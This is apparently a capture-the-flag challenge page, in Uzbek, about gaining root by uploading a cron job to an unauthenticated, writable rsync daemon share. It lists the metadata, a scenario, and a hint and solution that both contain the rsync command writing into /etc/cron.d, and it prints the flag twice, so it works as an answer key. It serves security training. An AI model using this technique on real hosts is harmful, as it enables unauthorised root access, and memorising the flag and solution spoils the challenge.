---
id: 43
title: "CH43: Rsync Daemon Writable Share Privilege Escalation"
module: "Modul 5: Automation, Systemd & Kernel"
difficulty: Hard
points: 8
tags: ['rsync', 'cron', 'privesc', 'networking']
flag: "HD{rsync_unauthenticated_share_cron_injection_943}"
---

# 🎯 Topshiriq #43: CH43: Rsync Daemon Writable Share Privilege Escalation

## 📌 Metama'lumotlar:
* **Modul:** `Modul 5: Automation, Systemd & Kernel`
* **Qiyinlik darajasi:** `🔴 Hard`
* **Maksimal Ball:** `⭐ 8 ball`
* **Teglar:** #rsync, #cron, #privesc, #networking

---

## 📝 Topshiriq Senariysi (Scenario):
Lokal 873-portda rsync demony `auth users` talab qilmaydigan 'root_fs' modulini ochib qo'ygan. `rsync` orqali /etc/cron.d/ ga yangi cronjob yuklang.

---

## 💡 Kichik Maslahat (Hint):
> [!TIP]
> rsync -av /tmp/my_cron rsync://127.0.0.1/root_fs/etc/cron.d/pwn

---

## 🛠️ Professional Yechim Ko'rsatmasi:
```bash
# Topshiriqni yechish bo'yicha ko'rsatma:
rsync -av /tmp/my_cron rsync://127.0.0.1/root_fs/etc/cron.d/pwn
```

---

## 🚩 Maxfiy Flag:
`HD{rsync_unauthenticated_share_cron_injection_943}`
